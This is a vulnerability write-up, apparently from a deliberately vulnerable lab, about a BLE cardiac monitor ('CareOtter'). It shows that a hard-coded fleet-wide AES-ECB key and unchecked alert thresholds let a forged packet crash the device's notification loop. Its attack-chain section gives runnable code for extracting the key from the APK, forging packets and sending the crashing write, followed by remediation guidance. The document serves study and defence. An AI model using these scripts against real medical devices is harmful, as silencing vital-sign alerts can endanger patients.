---
id: IoT:I7
title: "Insecure Data Transfer and Storage"
category: IoT
status: DONE
severity: High
owasp: "IoT I7 — Insecure Data Transfer and Storage"
cwe: "CWE-321 (Use of Hard-coded Cryptographic Key) / CWE-306 (Missing Authentication for Critical Function) / CWE-20 (Improper Input Validation) / CWE-369 (Divide By Zero) / CWE-703 (Improper Check or Handling of Exceptional Conditions)"
source_docs:
  - "CareOtter_IoT.md §IoT:I3 §3.3 (migrated and re-classified)"
affected_components:
  - "labs/careotter/files/opt/medical-sensor/ble_server.py"
verified_date: ""
---

# IoT:I7 — Insecure Data Transfer and Storage

> **Status:** DONE
> **OWASP:** IoT I7 — Insecure Data Transfer and Storage
> **CWE:** CWE-321 / CWE-306 / CWE-20 / CWE-369 / CWE-703
> **Severity:** High

---

## Why It Matters

The monitor accepts clinical alert thresholds over BLE in a custom packet format it calls CSCP v1. OWASP IoT I7 is about data being transferred or stored without adequate protection. CareOtter gets the transfer wrong at the cryptographic root: every CSCP packet is "encrypted" with AES-ECB under a single hard-coded key (`careotter-key-16`) that is identical on every device and extractable from the Android APK. A shared, static, ECB key is neither confidentiality nor integrity — it is obfuscation that any attacker can reproduce, so the "encrypted" clinical channel is fully forgeable from BLE range.

Because the transport gives the device no real assurance about who sent a packet or whether its contents are sane, a forged CSCP write with an inverted threshold window crashes the notification task and silently stops all vitals updates. The insecure transfer (CWE-321) is the enabler, the deferred denial of service (CWE-369 reached through CWE-20) is the impact.

> Originally written as `CareOtter_IoT.md` §IoT:I3 §3.3. It is re-filed here under I7 because the core defect is an insecurely transferred clinical data channel (hard-coded crypto, no integrity, no validation), not an insecure interface *outside* the device.

---

## 7.1 — CSCP v1 threshold forging → deferred ZeroDivisionError DoS

### Description

`AlertThresholdChrc.WriteValue` accepts GATT writes without authentication or pairing. The only protection on the payload is AES-ECB under the fleet-wide key `careotter-key-16` plus a CRC32, both reproducible by anyone, so the packet is forgeable. When a client writes a valid CSCP v1 packet with `bpm_min >= bpm_max`, the global variable `_alert_bpm_window` ends up with value `<= 0`.

The crash does not occur immediately but is **deferred**: the asyncio task `update_and_notify()` runs every 2 seconds via `update_loop()`, and on its first cycle after the write it calls `_compute_alert_window()`, which performs division by `_alert_bpm_window`. The uncaught `ZeroDivisionError` kills the asyncio task, permanently stopping all BLE notifications until the process is manually restarted.

This deferred crash pattern complicates triage: `WriteValue` responds with success, the process remains visible in `ps`, but notifications silently cease about two seconds later.

### OWASP Classification

| Category | Role |
|----------|------|
| **I7 — Insecure Data Transfer and Storage** | Primary — clinical thresholds transferred under a hard-coded fleet-wide AES-ECB key (CWE-321), with no integrity, so the channel is fully forgeable |
| **I2 — Insecure Network Services** | Secondary — the device service accepts the write unauthenticated and without semantic validation (`bpm_max > bpm_min`), CWE-306 / CWE-20 |
| **I9 — Insecure Default Settings** | Contributing — no watchdog or automatic asyncio task restart |
| **Mobile M1 (mobile side)** | Cross-ref — the fleet-wide CSCP key (`careotter-key-16`) is hard-coded in the patient APK and recovered there. Owned by [[M1_Improper_Credential_Usage]] |

### Complete Attack Chain

**Step 1 — Static reconnaissance (OWASP Mobile M1)**

Extract the CSCP key and characteristic UUID from the APK:

```bash
# Decompile the APK
apktool d careotter_app.apk -o careotter_decompiled
# or with jadx:
jadx careotter_app.apk -d careotter_src

# Search for AES key and UUID
grep -r "careotter-key" careotter_src/
grep -r "0000ff01"      careotter_src/
```

Expected result:
```
CSCP_KEY  = b"careotter-key-16"      # in ble_server.py / BleMonitorClient.java
CHAR_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
```

The same fleet-wide key lives in both the device firmware and the mobile app, so recovering it once forges packets for every CareOtter unit.

**Step 2 — Passive BLE discovery**

Confirm that `CareOtter_HR` exposes characteristic `0xFF01` with the `write` flag:

```bash
# With bleak (Python)
python3 -c "
import asyncio
from bleak import BleakScanner, BleakClient

async def discover():
    devs = await BleakScanner.discover(timeout=5)
    for d in devs:
        if d.name == 'CareOtter_HR':
            print(f'Found: {d.address}')
            async with BleakClient(d.address) as c:
                for svc in c.services:
                    for chrc in svc.characteristics:
                        if 'ff01' in chrc.uuid:
                            print(f'  UUID={chrc.uuid} props={chrc.properties}')

asyncio.run(discover())
"
```

Expected output:
```
Found: B8:27:EB:XX:XX:XX
  UUID=0000ff01-0000-1000-8000-00805f9b34fb  props=['read', 'write', 'notify']
```

**Step 3 — Forge CSCP v1 payload**

Build a valid 24-byte packet with `bpm_min=100, bpm_max=100` (window = 0):

```python
# Requires: pip install pycryptodome
import struct, binascii
from Crypto.Cipher import AES

CSCP_KEY   = b"careotter-key-16"
CSCP_MAGIC = 0xCAFE0DDA

def forge_cscp(bpm_min: int, bpm_max: int, spo2_min: int) -> bytes:
    """Forge a valid 24-byte CSCP v1 packet."""
    plaintext  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ciphertext = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(plaintext)
    crc        = binascii.crc32(ciphertext) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ciphertext

# Malicious payload: bpm_min == bpm_max → _alert_bpm_window = 0
payload = forge_cscp(bpm_min=100, bpm_max=100, spo2_min=90)
print(f"Payload ({len(payload)}B): {payload.hex()}")
```

**Step 4 — Exploitation**

Write the payload to characteristic `0xFF01`:

```python
import asyncio, struct, binascii
from bleak import BleakScanner, BleakClient
from Crypto.Cipher import AES

CSCP_KEY   = b"careotter-key-16"
CSCP_MAGIC = 0xCAFE0DDA
CHAR_UUID  = "0000ff01-0000-1000-8000-00805f9b34fb"
DEVICE_NAME = "CareOtter_HR"

def forge_cscp(bpm_min, bpm_max, spo2_min):
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct  = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ct

async def exploit():
    devs = await BleakScanner.discover(timeout=5)
    target = next((d for d in devs if d.name == DEVICE_NAME), None)
    if not target:
        print("Device not found"); return

    async with BleakClient(target.address) as client:
        payload = forge_cscp(100, 100, 90)   # window = 0
        await client.write_gatt_char(CHAR_UUID, payload, response=True)
        print("[*] Write accepted — crash deferred ~2s")
        # WriteValue returns success immediately
        # ZeroDivisionError fires in update_and_notify() on next 2s tick

asyncio.run(exploit())
```

**Step 5 — DoS Verification**

```bash
# On the Raspberry Pi — before attack: notifications active
ssh root@192.168.2.1 "ps | grep ble_server"
# → shows the process

# Monitor log after attack
ssh root@192.168.2.1 "tail -f /var/log/ble_server.log 2>/dev/null || logread -f | grep BLE"
# → after ~2s the traceback appears:
# ZeroDivisionError: float division by zero
# [asyncio] Task exception was never retrieved

# Process remains in memory (silent DoS):
ssh root@192.168.2.1 "ps | grep ble_server"
# → still visible, but no longer emits notifications

# Android app stops updating BPM and SpO2 — frozen screen
```

### Clinical Impact

In a real ambulatory cardiac monitor, the loss of BLE notifications means the patient's mobile app stops receiving real-time heart rate and SpO2 data. In tele-monitoring scenarios this silent DoS can delay detection of critical arrhythmias or desaturation episodes, with potentially lethal consequences. The deferred nature of the crash (the process responds successfully to the write and only fails two seconds later) makes it difficult to correlate the failure with its cause in basic process monitoring.

### Remediation

1. **Validate in `WriteValue`** — reject the packet if `bpm_max <= bpm_min` before updating `_alert_bpm_window`:

   ```python
   if thresholds["bpm_max"] <= thresholds["bpm_min"]:
       print(f"[BLE] CSCP v1 WriteValue: rejected (invalid window) {thresholds}")
       return
   ```

2. **Authenticate the channel** — require LE Secure Connections pairing (MITM protection) before accepting writes to clinical configuration characteristics, and replace the fleet-wide static AES-ECB key with a per-device key negotiated at pairing.

3. **Supervise the asyncio task** — wrap critical tasks with `add_done_callback` for automatic restart on uncaught exceptions:

   ```python
   def _restart_on_failure(task: asyncio.Task, coro_factory):
       if not task.cancelled() and task.exception():
           print(f"[BLE] Task crashed, restarting: {task.exception()}")
           new_task = asyncio.create_task(coro_factory())
           new_task.add_done_callback(
               lambda t: _restart_on_failure(t, coro_factory)
           )
   ```

---

## How It Should Be

- **Stop shipping a fleet-wide static key.** The CSCP key must be per-device and established through LE Secure Connections pairing, never compiled identically into firmware and the APK where one `grep` recovers it.
- **Use authenticated encryption, not AES-ECB + CRC.** ECB leaks structure and a CRC is not integrity. An AEAD construction (for example AES-GCM) binds confidentiality and integrity so a forged or replayed packet is rejected.
- **Validate every clinical field before use.** Threshold windows must be range-checked (`bpm_max > bpm_min`, sane SpO2 bounds) at the boundary, before any arithmetic.
- **Fail safe under bad input.** A malformed clinical packet must never be able to take the notification path down — supervise the loop and restart it, and surface the failure rather than crashing silently.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Transport crypto | Per-device key via LE Secure Connections, AEAD (AES-GCM) instead of AES-ECB + CRC | Make the channel non-forgeable (CWE-321) |
| AuthN | Require pairing/bonding before writes to clinical characteristics | Stop unauthenticated writes (CWE-306) |
| Input validation | Range-check `bpm_min`/`bpm_max`/`spo2_min` in `WriteValue` | Reject inverted windows (CWE-20) |
| Resilience | Supervise `update_and_notify()` with restart-on-exception | Prevent the silent deferred DoS (CWE-369 / CWE-703) |

---

## Verification Checklist

- [ ] **§7.1 (key)**: the CSCP key `careotter-key-16` is recoverable from both `ble_server.py` and the APK, and the same key decrypts/forges a packet for any unit.
- [ ] **§7.1 (forge)**: a forged CSCP v1 packet with `bpm_min == bpm_max` is accepted by `WriteValue` on `0xFF01` with no pairing.
- [ ] **§7.1 (DoS)**: about two seconds after the write the device log shows `ZeroDivisionError: float division by zero`, the `ble_server` process stays in `ps`, and BLE notifications stop (the Android app freezes on the last BPM/SpO2 values).

---

## Glossary

| Term | Definition |
|---|---|
| **CSCP** | **CareOtter Secure Config Protocol** (version 1, "CSCP v1"). The vendor's proprietary BLE format for writing clinical alert thresholds (`bpm_min`, `bpm_max`, `spo2_min`) to GATT characteristic `0xFF01`. A 24-byte packet: `[magic 4B = 0xCAFE0DDA][CRC32 4B over the ciphertext][AES-128-ECB(3 threshold bytes + 13 null pad) 16B]`, keyed with the fleet-wide constant `careotter-key-16`. Marketed as "AES-128 military-grade encryption," but for IoT7 the point is that this is the device's data-transfer format: a hard-coded transport key (CWE-321) and a validator that checks only magic, CRC, and AES, never the clinical sanity of the decrypted values, which is what makes the `bpm_min >= bpm_max` divide-by-zero DoS reachable (§7.1). Expanded in `docs/CareOtter/Architecture_Analysis.md`. |

---

## References

- Migrated and re-classified from `docs/CareOtter/IoT/CareOtter_IoT.md` §IoT:I3 §3.3 (CSCP v1 threshold forging / deferred ZeroDivisionError DoS).
- `labs/careotter/files/opt/medical-sensor/ble_server.py` — `AlertThresholdChrc.WriteValue`, `_compute_alert_window`, `update_and_notify`, the CSCP v1 parser and `CSCP_KEY`.
- Related BLE-surface cases: [[IoT6_Insufficient_Privacy_Protection]] (§3.1/3.2 passive leaks), [[IoT2_Insecure_Network_Services]] §2.4 (hidden provisioning backdoor).
- Mobile siblings of this chain: [[M1_Improper_Credential_Usage]] (the APK-side hard-coded CSCP key, the credential lens), [[M3_Insecure_Authentication_Authorization]] (the operation-authentication and replay lens — why the packet is accepted as authority), and [[M5_Insecure_Communication]] (the unauthenticated, unencrypted channel the forged packet rides).
